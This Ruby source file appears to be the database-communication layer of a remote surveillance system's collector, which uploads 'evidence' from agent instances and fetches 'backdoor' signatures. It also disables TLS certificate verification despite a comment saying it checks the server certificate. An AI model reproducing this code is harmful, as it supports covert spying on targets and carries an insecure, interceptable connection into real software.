#
#  DB layer for REST communication
#

# from RCS::Common
require 'rcs-common/trace'

# system
require 'timeout'
require 'thread'
require 'json'

module RCS
module Collector

class DB_rest
  include RCS::Tracer

  # if a method does not reply in X seconds consider db down
  DB_TIMEOUT = 10

  def initialize(host)
    @host, @port = host.split(':')

    # the mutex to avoid race conditions
    @semaphore = Mutex.new

    # the HTTP connection object
    @http = Net::HTTP.new(@host, @port)
    @http.use_ssl = true
    
    # no SSL verify for this connection
    @http.verify_mode = OpenSSL::SSL::VERIFY_NONE

    # CA certificate to check if the server ssl certificate is valid
    @http.ca_file = Config.file('DB_CERT')

    # our client certificate to send to the server
    @http.cert = OpenSSL::X509::Certificate.new(File.read(Config.file('DB_CERT')))

    trace :debug, "Using REST to communicate with #{@host}:#{@port}"
  end

  # generic method invocation
  def rest_call(method, uri, content = nil, headers = {})
    begin
      Timeout::timeout(DB_TIMEOUT) do
        return @semaphore.synchronize do
          # the HTTP headers for the authentication
          full_headers = {'Cookie' => @cookie }
          full_headers.merge! headers if headers.is_a? Hash
          case method
            when 'POST'
              # perform the post
              @http.request_post(uri, content, full_headers)
            when 'GET'
              @http.request_get(uri, full_headers)
          end
        end
      end
    rescue
      # ensure the mutex is unlocked on timeout or errors
      @semaphore.unlock if @semaphore.locked?
      # propagate the exception to the upper layer
      raise
    end
  end

  # timeout exception propagator
  def propagate_error(e)
    # the db is down we have to report it to the upper layer
    # it means that we are not able to talk to the db
    trace :warn, "The DB in not responding: #{e.class} #{e.message}"
    raise
  end


  # log in to the database
  # returns a boolean
  def login(user, pass)
    begin
      # send the authentication data
      account = {:user => user, :pass => pass}
      resp = @http.request_post('/auth/login', account.to_json, nil)
      # remember the session cookie
      @cookie = resp['Set-Cookie'] unless resp['Set-Cookie'].nil?
      # check that the response is valid JSON
      return JSON.parse(resp.body)['cookie'] == @cookie
    rescue Exception => e
      trace :error, "Error logging in: #{e.class} #{e.message}"
      return false
    end
  end

  def logout
    begin
      rest_call('POST', '/auth/logout', nil)
      return true
    rescue Exception => e
      trace :error, "Error logging out: #{e.class} #{e.message}"
      return false
    end
  end

  def sync_start(session, version, user, device, source, time)
    begin
      content = {:bid => session[:bid],
                 :build => session[:build],
                 :instance => session[:instance],
                 :subtype => session[:subtype],
                 :version => version,
                 :user => user,
                 :device => device,
                 :source => source,
                 :sync_time => time}
      
      rest_call('POST', '/evidence/start', content.to_json)
    rescue
    end
  end

  def sync_timeout(session)
    begin
      content = {:bid => session[:bid], :instance => session[:instance]}
      return rest_call('POST', '/evidence/timeout', content.to_json)
    rescue Exception => e
      trace :error, "Error calling sync_timeout: #{e.class} #{e.message}"
      propagate_error e
    end
  end

  def sync_end(session)
    begin
      content = {:bid => session[:bid], :instance => session[:instance]}
      return rest_call('POST', '/evidence/stop', content.to_json)
    rescue Exception => e
      trace :error, "Error calling sync_end: #{e.class} #{e.message}"
      propagate_error e
    end
  end

  def send_evidence(instance, evidence)
    begin
      ret = rest_call('POST', "/evidence/#{instance}", evidence)
      
      if ret.kind_of? Net::HTTPSuccess then
        return true
      end

      return false, ret.body
    rescue Exception => e
      trace :error, "Error calling send_evidence: #{e.class} #{e.message}"
      propagate_error e
    end
  end

  def status_update(component, remoteip, status, message, disk, cpu, pcpu)
    begin
      content = {:component => component, :ip => remoteip, :status => status, :message => message, :disk => disk, :cpu => cpu, :pcpu => pcpu}
      return rest_call('POST', '/status', content.to_json)
    rescue Exception => e
      trace :error, "Error calling status_update: #{e.class} #{e.message}"
      propagate_error e
    end
  end

  def backdoor_signature
    begin
      ret = rest_call('GET', '/signature/backdoor')
      sign = JSON.parse(ret.body)['sign']
      return sign
    rescue Exception => e
      trace :error, "Error calling backdoor_signature: #{e.class} #{e.message}"
      propagate_error e
    end
  end

  def network_signature
    begin
      ret = rest_call('GET', '/signature/network')
      sign = JSON.parse(ret.body)['sign']
      return sign
    rescue Exception => e
      trace :error, "Error calling network_signature: #{e.class} #{e.message}"
      propagate_error e
    end
  end

end #

end #Collector::
end #RCS::